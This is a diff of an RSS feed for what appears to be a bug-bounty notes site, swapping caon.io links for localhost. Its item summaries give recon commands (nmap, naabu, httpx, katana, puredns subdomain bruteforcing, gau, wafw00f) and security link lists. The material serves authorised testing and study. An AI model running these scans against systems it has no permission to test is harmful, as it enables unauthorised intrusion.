+      <description> Port Scan Nmap # https://github.com/nmap/nmap ./configure make make install nmap -sC -sV example.com nmap example.com https://3os.org/penetration-testing/cheatsheets/nmap-cheatsheet/
+Naabu # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com cat list | naabu -top-ports 100 -ep 80,443,8080,8443 </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/probing/</link>
+      <link>http://localhost/recon/probing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/probing/</guid>
-      <description>Probing # Validates a list of urls, checks to see if they are alive or not.
-httpX # # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out Hold down!
+      <guid>http://localhost/recon/probing/</guid>
+      <description>Probing Validates a list of urls, checks to see if they are alive or not.
+httpX # https://github.com/projectdiscovery/httpx # go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest cat urls | httpx -random-agent -retries 2 -o out Hold down!
 For some reason httpx fails to retrieve all good working urls. It is recommended to run httpx more than once to achieve better results.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/scope/</link>
+      <link>http://localhost/recon/scope/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/scope/</guid>
-      <description>Scope # A scope can be defined as of the limit of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.
+      <guid>http://localhost/recon/scope/</guid>
+      <description>A scope can be defined as of the limit of where your research should go, if you ever find a bug, this must reside inside the scope, otherwise, the finding is not valid.
 Example of scope
 In-Scope Out of scope example.com subdomain.example.com *-dev.example.com The scope above states that example.com and www.example.com are valid (www is a subdomain, example.com points to www by default).
 Any subdomain under -dev.example.com is valid as well, the wildcard symbol (*) states that anything is valid.</description>
@@ -534,158 +537,185 @@ Any subdomain under -dev.example.com is valid as well, the wildcard symbol (*) s
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/screenshot/</link>
+      <link>http://localhost/recon/screenshot/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/screenshot/</guid>
-      <description> Screenshot # For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.
+      <guid>http://localhost/recon/screenshot/</guid>
+      <description> Screenshot For large recons where manual website visit is not doable. The program would grab a list of valid urls and screenshot them using a headless browser.
 Hold down!
 A browser must be installed prior using an screenshotter. Chrome or chromium is recommended.
-GoWitness # # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t &amp;lt;threads&amp;gt; </description>
+GoWitness # https://github.com/sensepost/gowitness gowitness file -f websites.txt -t &amp;lt;threads&amp;gt; </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/spider/</link>
+      <link>http://localhost/recon/spider/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/spider/</guid>
-      <description> Spider # Crawling # katana # # go install github.com/projectdiscovery/katana/cmd/katana@latest cat hosts | katana -jc -kf all -nc -ef png,jpg,jpeg,css,gif,ttf,woff,woff2,svg,eot Check if hosts/paths are valid # # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt Find records # # https://github.com/projectdiscovery/dnsx dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt &amp;gt; dnsx_info.txt </description>
+      <guid>http://localhost/recon/spider/</guid>
+      <description> Spider Crawling katana # go install github.com/projectdiscovery/katana/cmd/katana@latest cat hosts | katana -jc -kf all -nc -ef png,jpg,jpeg,css,gif,ttf,woff,woff2,svg,eot Check if hosts/paths are valid # https://github.com/projectdiscovery/httpx cat links.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt Find records # https://github.com/projectdiscovery/dnsx dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt &amp;gt; dnsx_info.txt </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/subdomain/active/</link>
+      <link>http://localhost/recon/subdomain/active/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/subdomain/active/</guid>
-      <description> Active Resources # The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.
+      <guid>http://localhost/recon/subdomain/active/</guid>
+      <description> Active Resources The ideia behind an active subdomain recon is to bruteforce subdomain in order to find anything that is valid.
 Get resolvers at:
-# https://github.com/proabiral/Fresh-Resolvers wget https://github.com/proabiral/Fresh-Resolvers/blob/master/resolvers.txt Pure DNS # # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations # # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md </description>
+# https://github.com/proabiral/Fresh-Resolvers wget https://github.com/proabiral/Fresh-Resolvers/blob/master/resolvers.txt Pure DNS # https://github.com/d3mondev/puredns puredns resolve subdomains.txt -r resolvers.txt --write resolved_dns_domains puredns bruteforce subdomains.txt example.com -r resolvers.txt --write resolved_dns_domains Permutations # https://github.com/Josue87/gotator gotator -sub subdomains/subdomains.txt -perm permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/subdomain/passive/</link>
+      <link>http://localhost/recon/subdomain/passive/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/subdomain/passive/</guid>
-      <description>Passive Resources # A passive resource means that you will grab subdomains that were already discovered by another tools or were found lying around in some place (open source code, legacy scripts, logs, etc).
-# https://github.com/OWASP/Amass amass enum -passive -d domain.com # https://github.com/projectdiscovery/subfinder subfinder -d domain.com -all -silent # https://github.com/tomnomnom/assetfinder assetfinder --subs-only example.com # https://github.com/Findomain/Findomain findomain -u example.com -q # https://github.com/lc/gau # https://github.com/tomnomnom/unfurl gau --subs example.com | unfurl -u domains All in one script # amass enum -passive -d domain.</description>
+      <guid>http://localhost/recon/subdomain/passive/</guid>
+      <description>Passive Resources A passive resource means that you will grab subdomains that were already discovered by another tools or were found lying around in some place (open source code, legacy scripts, logs, etc).
+# https://github.com/OWASP/Amass amass enum -passive -d domain.com # https://github.com/projectdiscovery/subfinder subfinder -d domain.com -all -silent # https://github.com/tomnomnom/assetfinder assetfinder --subs-only example.com # https://github.com/Findomain/Findomain findomain -u example.com -q # https://github.com/lc/gau # https://github.com/tomnomnom/unfurl gau --subs example.com | unfurl -u domains All in one script amass enum -passive -d domain.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/thirdparty/</link>
+      <link>http://localhost/recon/thirdparty/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/thirdparty/</guid>
-      <description>Third Party # Waybackmachine &amp;amp; others # Use gau to search for old files and paths from crawl websites
-echo &amp;#34;example.com&amp;#34; | gau Alienvault # Look under Associated Urls
+      <guid>http://localhost/recon/thirdparty/</guid>
+      <description>Third Party Waybackmachine &amp;amp; others Use gau to search for old files and paths from crawl websites
+echo &amp;#34;example.com&amp;#34; | gau Alienvault Look under Associated Urls
 https://otx.alienvault.com/indicator/domain/example.com
-AWS Scraping # By visiting IP&amp;rsquo;s under AWS control and looking for certificates it is possible to find content owned by a company.
+AWS Scraping By visiting IP&amp;rsquo;s under AWS control and looking for certificates it is possible to find content owned by a company.
 https://github.com/jhaddix/awsScrape/
-More # https://leakix.net/</description>
+More https://leakix.net/</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/wafcheck/</link>
+      <link>http://localhost/recon/wafcheck/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/wafcheck/</guid>
-      <description> WAF Check # Wafw00f # # https://github.com/EnableSecurity/wafw00f wafw00f -i websites.txt </description>
+      <guid>http://localhost/recon/wafcheck/</guid>
+      <description> WAF Check Wafw00f # https://github.com/EnableSecurity/wafw00f wafw00f -i websites.txt </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/whois/</link>
+      <link>http://localhost/recon/whois/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/whois/</guid>
-      <description> Whois # https://www.whatsmydns.net/domain-name-owner Reverse Whois # https://tools.whoisxmlapi.com/reverse-whois-search Whois History # https://www.whoxy.com Whois mass checking: # https://github.com/melbadry9/WhoEnum </description>
+      <guid>http://localhost/recon/whois/</guid>
+      <description> Whois https://www.whatsmydns.net/domain-name-owner Reverse Whois https://tools.whoisxmlapi.com/reverse-whois-search Whois History https://www.whoxy.com Whois mass checking: https://github.com/melbadry9/WhoEnum </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/recon/wordlistgeneration/</link>
+      <link>http://localhost/recon/wordlistgeneration/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/recon/wordlistgeneration/</guid>
-      <description> Wordlist generation # After spidering across the target it is a good idea to check the content discovered and append the newly discovered content to your wordlist.
-Parameters # # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys | anew all_parameters.txt Paths # cat links.txt | unfurl paths | rev | cut -d &amp;#39;/&amp;#39; -f1 | rev | anew paths.txt </description>
+      <guid>http://localhost/recon/wordlistgeneration/</guid>
+      <description> Wordlist generation After spidering across the target it is a good idea to check the content discovered and append the newly discovered content to your wordlist.
+Parameters # https://github.com/tomnomnom/anew cat links.txt | unfurl -u keys | anew all_parameters.txt Paths cat links.txt | unfurl paths | rev | cut -d &amp;#39;/&amp;#39; -f1 | rev | anew paths.txt </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/burp/</link>
+      <link>http://localhost/resources/burpsuite/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/burp/</guid>
-      <description>Burp Suite # Plugins # Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns JS Link Finder, find links inside javascript files Param Miner, mines urls searching for parameters Reflector, find reflected inputs Tips n Tricks # Send traffic from VPS to local burp # # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.</description>
+      <guid>http://localhost/resources/burpsuite/</guid>
+      <description>Burp Suite Plugins Backslash powered scanner, find additional vulns JS Miner, gets sensitive content from js files Active Scan++, find additional vulns JS Link Finder, find links inside javascript files Param Miner, mines urls searching for parameters Reflector, find reflected inputs Tips n Tricks Send traffic from VPS to local burp # Run this in terminal connecting to vps (if ssh with key is possible) # When in WSL, portforwarding needs to be set ssh -R 8080:127.</description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/career/</link>
+      <link>http://localhost/resources/career/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/career/</guid>
-      <description> Career Advice # Site Description https://github.com/rezaduty/cybersecurity-career-path/blob/master/Security_Engineer(Software).md CyberSec career path https://devskiller.com/screen-security-engineer/ Security Engineer Career https://hbr.org/1999/11/management-time-whos-got-the-monkey About management time https://shellsharks.com/getting-into-information-security Steps to start in infosec https://roadmap.sh/cyber-security CyberSec toadmap Boost your CV # Site Description https://cve-north-stars.github.io/ Get some CVE&amp;rsquo;s </description>
+      <guid>http://localhost/resources/career/</guid>
+      <description> Career Advice Site Description https://github.com/rezaduty/cybersecurity-career-path/blob/master/Security_Engineer(Software).md CyberSec career path https://devskiller.com/screen-security-engineer/ Security Engineer Career https://hbr.org/1999/11/management-time-whos-got-the-monkey About management time https://shellsharks.com/getting-into-information-security Steps to start in infosec https://roadmap.sh/cyber-security CyberSec toadmap Boost your CV Site Description https://cve-north-stars.github.io/ Get some CVE&amp;rsquo;s </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/regexes/</link>
+      <link>http://localhost/resources/regexes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/regexes/</guid>
-      <description> Regexes # Site About https://www.autoregex.xyz/ Generate based on text https://github.com/mazen160/secrets-patterns-db Database of regexes secrets </description>
+      <guid>http://localhost/resources/regexes/</guid>
+      <description> Regexes Site About https://www.autoregex.xyz/ Generate based on text https://github.com/mazen160/secrets-patterns-db Database of regexes secrets </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/repositories/</link>
+      <link>http://localhost/resources/repositories/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/repositories/</guid>
-      <description> Respositories # Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side https://github.com/Bandit-HaxUnit/haxunit Workflow for recon https://github.com/edoardottt/awesome-hacker-search-engines Awesome search engines </description>
+      <guid>http://localhost/resources/repositories/</guid>
+      <description> Respositories Repository Description https://github.com/Lissy93/personal-security-checklist#authentication Security Checklist from explanatory side https://github.com/Bandit-HaxUnit/haxunit Workflow for recon https://github.com/edoardottt/awesome-hacker-search-engines Awesome search engines </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/sites/</link>
+      <link>http://localhost/resources/sites/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/sites/</guid>
-      <description>Sites # Link Niche https://www.hahwul.com/ Blog https://netsec.expert/ Blog https://ihorrasch.com/ Blog https://www.agarri.fr/en Blog https://www.100security.com.br/ Blog (portuguese) https://www.hacking8.com/ Blog (chinese) https://www.rcesecurity.com Blog https://weboas.is/ Link aggregator https://portswigger.net/research Burp&amp;rsquo;s owner research blog https://blog.orange.tw/ Blog/Research https://swarm.ptsecurity.com/ PT Swarm research blog https://0xdf.gitlab.io/ Solving HTB machines https://sploitus.com/ Search engine to find exploits https://www.exploitalert.com/ Search engine to find exploits https://unsafe.sh Chinese forum https://secret.club/ About HW and low level hacking https://www.bugbountyhunting.com/ Bug Bounty Writeups https://y4er.com/posts/ Chinese security posts https://anchisesbr.</description>
+      <guid>http://localhost/resources/sites/</guid>
+      <description> Sites Link Niche https://www.hahwul.com/ Blog https://netsec.expert/ Blog https://ihorrasch.com/ Blog https://www.agarri.fr/en Blog https://www.100security.com.br/ Blog (portuguese) https://www.hacking8.com/ Blog (chinese) https://www.rcesecurity.com Blog https://weboas.is/ Link aggregator https://portswigger.net/research Burp&amp;rsquo;s owner research blog https://blog.orange.tw/ Blog/Research https://swarm.ptsecurity.com/ PT Swarm research blog https://0xdf.gitlab.io/ Solving HTB machines https://sploitus.com/ Search engine to find exploits https://www.exploitalert.com/ Search engine to find exploits https://unsafe.sh Chinese forum https://secret.club/ About HW and low level hacking https://www.bugbountyhunting.com/ Bug Bounty Writeups https://y4er.com/posts/ Chinese security posts https://anchisesbr.blogspot.com/ Portuguese security posts </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/tools/</link>
+      <link>http://localhost/resources/webtools/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/tools/</guid>
-      <description> Web Tools # Website Description https://www.utf8-chartable.de/ UTF-8 Table https://grep.app/ Grep over multiple github repositories https://publicwww.com/ Grep over multiple websites source codes https://www.degraeve.com/reference/urlencoding.php List of URL encoded characters https://api-guesser.netlify.app/ Input an api key and the script will return from where it belongs https://gchq.github.io/CyberChef/ For all purposes https://securityheaders.com/ Test sites for security headers https://builtwith.com Database of sites technologies https://deps.dev/ Open Source Insights </description>
+      <guid>http://localhost/resources/webtools/</guid>
+      <description> Web Tools Website Description https://www.utf8-chartable.de/ UTF-8 Table https://grep.app/ Grep over multiple github repositories https://publicwww.com/ Grep over multiple websites source codes https://www.degraeve.com/reference/urlencoding.php List of URL encoded characters https://api-guesser.netlify.app/ Input an api key and the script will return from where it belongs https://gchq.github.io/CyberChef/ For all purposes https://securityheaders.com/ Test sites for security headers https://builtwith.com Database of sites technologies https://deps.dev/ Open Source Insights </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/writeups/</link>
+      <link>http://localhost/resources/writeups/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/writeups/</guid>
-      <description> Write Ups # WriteUp Description https://pentester.land/list-of-bug-bounty-writeups.html List of up to date writeups https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/ Common vulns often missed http://www.pc-help.org/obscure.htm Obscure URLs, useful for SSRF https://ctftime.org/writeups?tags=web200&amp;hidden-tags=web%2cweb100%2cweb200 CTF writeups https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ Android testing in windows 11 https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/payment-bypasses Payment Flow Vulnerabilites </description>
+      <guid>http://localhost/resources/writeups/</guid>
+      <description> Write Ups WriteUp Description https://pentester.land/list-of-bug-bounty-writeups.html List of up to date writeups https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/ Common vulns often missed http://www.pc-help.org/obscure.htm Obscure URLs, useful for SSRF https://ctftime.org/writeups?tags=web200&amp;hidden-tags=web%2cweb100%2cweb200 CTF writeups https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ Android testing in windows 11 https://gowthams.gitbook.io/bughunter-handbook/intresting-vulnerabilities/payment-bypasses Payment Flow Vulnerabilites </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://caon.io/resources/youtubechannels/</link>
+      <link>http://localhost/resources/youtubechannels/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://caon.io/resources/youtubechannels/</guid>
-      <description> Youtube Channels # Name Channel Ippsec https://www.youtube.com/c/ippsec Reconless https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ </description>
+      <guid>http://localhost/resources/youtubechannels/</guid>
+      <description> Youtube Channels Name Channel Ippsec https://www.youtube.com/c/ippsec Reconless https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ </description>
+    </item>
+    
+    <item>
+      <title>Exploitation</title>
+      <link>http://localhost/exploitation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost/exploitation/</guid>
+      <description>Go bananas</description>
+    </item>
+    
+    <item>
+      <title>Recon</title>
+      <link>http://localhost/recon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost/recon/</guid>
+      <description>Everything about recon!</description>
+    </item>
+    
+    <item>
+      <title>Resources</title>
+      <link>http://localhost/resources/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost/resources/</guid>
+      <description>Cool stuff</description>
     </item>
     
   </channel>
